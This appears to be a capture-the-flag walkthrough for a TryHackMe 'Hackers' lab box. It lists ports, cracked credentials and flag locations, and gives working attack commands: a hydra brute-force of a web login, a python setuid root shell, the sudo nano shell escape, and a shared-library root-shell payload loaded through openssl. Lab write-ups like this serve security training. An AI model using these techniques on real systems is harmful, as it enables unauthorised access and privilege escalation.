# KOTH HACKERS<br />

-------------
## IP: `10.10.68.205`<br />

----------------------
### Open Ports -<br />

```
21
22
80
9999
```

----------------------
#### hidden directories -<br />

```
/news
/contact
/img
/staff
/backdoor
```

----------------------
> first flag -<br />

```
thm{b6.............................}
```
`in the source code of default page on port 80`<br />

> second flag -<br />

```
thm{67.............................}
```
`in the hidden files on anonymous login with ftp ls  -la`<br />

-----------------------
##### Credentials -<br />


username: rcampbell<br />
password: cinderella<br />

username: gcrawford<br />
password: evelina<br />

`via hydra`<br />

-----------------------
> third flag -<br />

```
thm{12.............................}
```
`in the hidden files in ftp login with rcampbell ls -la` <br />

-----------------------
##### Login via ssh with rcampbell and search for `capabilities`<br />

```
getcap -r / 2>/dev/null
```
```
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

##### Crack the passphrase for `id_rsa` of gcrawford<br />

```
id_rsa:stephani
```
##### privilege escalation of `gcrawford` user cuz of sudo ability over `nano`<br/>

We can see nano's [Gtfo-Bins](https://gtfobins.github.io/gtfobins/nano/)

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
##### Crack the password for [backdoor](http://10.10.68.205/backdoor)<br />

username: plague<br />
password: tonyhawk<br />

```
hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.68.205 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"
```

##### You can get a rev shell with user `production` logged in and can achieve privilage escalation using this c code -<br />

Check out this blog for more on it [ld_preload-privesc](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

`gcc -o shell.so shell.c`


```
sudo openssl req -engine ./shell.so
```

-----------------------
> fourth flag - <br />

```
thm{b9.............................}
```
`in the root directory`<br />
> fifth flag -<br />

```
thm{d8.............................}
```
`in the home directory of gcrawford, within business.txt`<br />

> sixth flag - <br />

```
thm{87.............................}
```
`in the home directory of production`<br />

> seventh flag - <br />

```
thm{3c.............................}
```
`in the home directory of tryhackme`<br />

> eighth flag -

```
thm{21.............................}
```
`in /etc/vsftpd.conf`<br />

> ninth flag -

```
thm{06.............................}
```
`in /etc/ssh/sshd_config`
